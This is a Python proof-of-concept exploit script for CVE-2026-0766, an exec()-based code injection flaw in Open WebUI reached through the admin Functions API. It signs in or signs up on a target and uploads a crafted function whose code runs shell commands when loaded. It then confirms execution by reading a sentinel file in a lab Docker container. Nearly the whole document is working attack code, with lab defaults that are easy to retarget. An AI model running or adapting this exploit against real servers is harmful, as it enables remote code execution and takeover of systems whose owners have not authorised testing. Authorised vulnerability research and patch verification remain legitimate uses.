#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : CVE-2026-0766 — Open WebUI exec() Code Injection (Function Create)
# Author         : Exploit Intelligence Platform
# Vendor         : open-webui
# Software       : Open WebUI <= v0.8.5
# CVE            : CVE-2026-0766
# CWE            : CWE-94 (Code Injection)
# CVSS           : 8.8 (HIGH)
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Disclaimer     : For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC Vector 2 for CVE-2026-0766: Code Execution via Function Creation

Demonstrates the SAME exec() vulnerability through a DIFFERENT entry point:
the Functions API (POST /api/v1/functions/create) instead of the Tools API.

The load_function_module_by_id() function at plugin.py line 145 contains an
identical exec(content, module.__dict__) call. The functions endpoint requires
admin privileges (uses get_admin_user dependency), whereas the tools endpoint
may be accessible to non-admin users with workspace.tools permission.

This vector proves the vulnerability exists in BOTH tool and function code paths.

Attack Vector: POST /api/v1/functions/create
Auth Required: Admin only
Vulnerable Function: load_function_module_by_id() at plugin.py:145
"""

import sys
import json
import uuid
import time
import urllib.request
import urllib.error


DEFAULT_HOST = "172.19.0.7"
DEFAULT_PORT = 8080

ADMIN_EMAIL = "admin@cveforge.lab"
ADMIN_PASSWORD = "LabPass123"
ADMIN_NAME = "Lab Admin"

SENTINEL_FILE = "/tmp/cve-2026-0766-functions-proof"
SENTINEL_VALUE = "CVE-2026-0766-FUNCTIONS-RCE"


def log(msg):
    print(f"[*] {msg}")

def log_ok(msg):
    print(f"[+] {msg}")

def log_err(msg):
    print(f"[-] {msg}")


def http_request(url, data=None, headers=None, method=None):
    """Make an HTTP request using urllib."""
    if headers is None:
        headers = {}
    if data is not None:
        if isinstance(data, dict):
            data = json.dumps(data).encode("utf-8")
            headers.setdefault("Content-Type", "application/json")
        elif isinstance(data, str):
            data = data.encode("utf-8")

    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            try:
                return resp.status, json.loads(body)
            except json.JSONDecodeError:
                return resp.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        try:
            return e.code, json.loads(body)
        except json.JSONDecodeError:
            return e.code, body
    except urllib.error.URLError as e:
        return 0, str(e.reason)


def authenticate(base_url):
    """Authenticate and return JWT token."""
    log("Authenticating...")

    status, resp = http_request(
        f"{base_url}/api/v1/auths/signin",
        data={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD},
    )

    if status == 200 and isinstance(resp, dict) and "token" in resp:
        log_ok(f"Signed in as {resp.get('role', 'unknown')}")
        return resp["token"]

    # Try signup for fresh instance
    log("  Trying signup...")
    status, resp = http_request(
        f"{base_url}/api/v1/auths/signup",
        data={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD, "name": ADMIN_NAME},
    )

    if status == 200 and isinstance(resp, dict) and "token" in resp:
        log_ok(f"Signed up as {resp.get('role', 'unknown')}")
        return resp["token"]

    log_err(f"Auth failed: HTTP {status} — {resp}")
    return None


def exploit(target_host, target_port):
    """
    Exploit CVE-2026-0766 via the Functions API.

    This uses POST /api/v1/functions/create which calls
    load_function_module_by_id() → exec(content, module.__dict__)
    at plugin.py line 145.

    The key difference from the Tools vector:
    - Different API endpoint (/api/v1/functions/create vs /api/v1/tools/create)
    - Different vulnerable function (load_function_module_by_id vs load_tool_module_by_id)
    - Requires a class named one of: Pipe, Pipeline, Filter (not "Tools")
    - Admin-only endpoint (get_admin_user dependency)
    """
    base_url = f"http://{target_host}:{target_port}"

    print("=" * 70)
    print("  CVE-2026-0766: Open WebUI RCE — Vector 2 (Functions API)")
    print("  Endpoint: POST /api/v1/functions/create")
    print("  Vulnerable fn: load_function_module_by_id() at plugin.py:145")
    print(f"  Target: {base_url}")
    print("=" * 70)
    print()

    # Step 1: Check target
    log("Checking target...")
    status, _ = http_request(f"{base_url}/health")
    if status != 200:
        log_err(f"Target unreachable: HTTP {status}")
        return False
    log_ok("Target is up")

    # Step 2: Authenticate
    token = authenticate(base_url)
    if not token:
        log_err("Authentication failed")
        return False
    print()

    # Step 3: Craft function payload
    # Functions expect a Pipe, Pipeline, or Filter class instead of Tools
    func_id = f"poc_func_{uuid.uuid4().hex[:8]}"
    command = "id && uname -a && cat /etc/os-release | head -5"

    log(f"Crafting malicious function payload (id: {func_id})...")

    # The content for functions API: arbitrary Python code + required class
    content = f"""import os
import subprocess

# ── CVE-2026-0766 Vector 2: Code injection via Functions API ──
# Executes during exec() in load_function_module_by_id() at plugin.py:145
# This is a DIFFERENT code path from the Tools API vector

result = subprocess.run(
    {command!r},
    shell=True,
    capture_output=True,
    text=True
)

with open("{SENTINEL_FILE}", "w") as f:
    f.write("{SENTINEL_VALUE}\\n")
    f.write("Vector: Functions API (POST /api/v1/functions/create)\\n")
    f.write("Vulnerable fn: load_function_module_by_id() at plugin.py:145\\n")
    f.write("Command: " + {command!r} + "\\n")
    f.write("Output:\\n" + result.stdout + "\\n")
    f.write("UID: " + subprocess.run("id", capture_output=True, text=True, shell=True).stdout.strip() + "\\n")

# Functions require a Pipe class (or Pipeline or Filter)
# This is the equivalent of the Tools class for the functions code path
class Pipe:
    \"\"\"Required class for function module validation.\"\"\"

    class Valves:
        pass

    def __init__(self):
        self.valves = self.Valves()

    def pipe(self, body: dict) -> str:
        return "CVE-2026-0766"
"""

    payload = {
        "id": func_id,
        "name": f"CVE-2026-0766 Functions PoC",
        "content": content,
        "meta": {
            "description": "PoC for CVE-2026-0766 via functions API",
            "manifest": {},
        },
    }

    log(f"Sending payload to /api/v1/functions/create ...")
    status, resp = http_request(
        f"{base_url}/api/v1/functions/create",
        data=payload,
        headers={"Authorization": f"Bearer {token}"},
    )

    log(f"Server response: HTTP {status}")
    if isinstance(resp, dict):
        # Don't print the full content back
        safe_resp = {k: v for k, v in resp.items() if k != "content"}
        log(f"Response (truncated): {json.dumps(safe_resp, indent=2)[:500]}")
    print()

    # Step 4: Verify execution
    log("Verifying code execution...")
    time.sleep(0.5)

    import subprocess as sp
    try:
        result = sp.run(
            ["docker", "exec", "cve-2026-0766-vulnerable", "cat", SENTINEL_FILE],
            capture_output=True,
            text=True,
            timeout=10,
        )
        if SENTINEL_VALUE in result.stdout:
            print("=" * 70)
            print("  EXPLOITATION SUCCESSFUL — Functions API RCE Confirmed")
            print("=" * 70)
            print()
            print("  Sentinel file contents:")
            for line in result.stdout.strip().split("\n"):
                print(f"    {line}")
            print()
            log_ok("CVE-2026-0766 Vector 2 CONFIRMED: RCE via load_function_module_by_id()")
            return True
        else:
            log_err(f"Sentinel not found. stdout: {result.stdout}")
            log_err(f"stderr: {result.stderr}")
            return False
    except Exception as e:
        log_err(f"Verification error: {e}")
        return False


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT

    success = exploit(target, port)
    sys.exit(0 if success else 1)
